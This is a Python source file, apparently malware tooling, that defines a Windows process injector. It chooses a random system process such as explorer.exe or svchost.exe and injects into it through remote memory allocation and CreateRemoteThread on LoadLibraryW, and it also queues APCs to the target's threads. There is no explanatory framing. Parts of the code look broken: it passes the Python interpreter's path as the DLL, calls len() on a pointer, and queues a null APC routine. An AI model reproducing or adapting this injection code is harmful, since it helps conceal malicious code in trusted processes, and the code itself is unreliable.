import ctypes
from ctypes import wintypes
import psutil
import random
import sys

kernel32 = ctypes.windll.kernel32
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

class ProcessInjector:
    def __init__(self):
        self.target_procs = ['explorer.exe', 'svchost.exe', 'RuntimeBroker.exe', 'dwm.exe']
        self.injected = False
        
    def inject_random_process(self):
        proc_name = random.choice(self.target_procs)
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == proc_name.lower():
                return self.inject_dll(proc.info['pid'])
        return False
    
    def inject_dll(self, pid):
        try:
            dll_path = ctypes.c_wchar_p(sys.executable)
            h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                return False
            arg_addr = kernel32.VirtualAllocEx(h_process, None, len(dll_path), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
            if not arg_addr:
                kernel32.CloseHandle(h_process)
                return False
            written = ctypes.c_size_t()
            kernel32.WriteProcessMemory(h_process, arg_addr, dll_path, len(dll_path), ctypes.byref(written))
            h_kernel32 = kernel32.GetModuleHandleW("kernel32.dll")
            h_loadlib = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryW")
            h_thread = kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_addr, 0, None)
            if h_thread:
                kernel32.WaitForSingleObject(h_thread, 0xFFFFFFFF)
                kernel32.CloseHandle(h_thread)
            kernel32.CloseHandle(h_process)
            self.injected = True
            return True
        except:
            return False
    
    def inject_apc(self, pid):
        try:
            proc = psutil.Process(pid)
            for thread in proc.threads():
                t_handle = kernel32.OpenThread(0x1F03FF, False, thread.id)
                if t_handle:
                    kernel32.QueueUserAPC(t_handle, 0, 0)
                    kernel32.CloseHandle(t_handle)
            return True
        except:
            return False

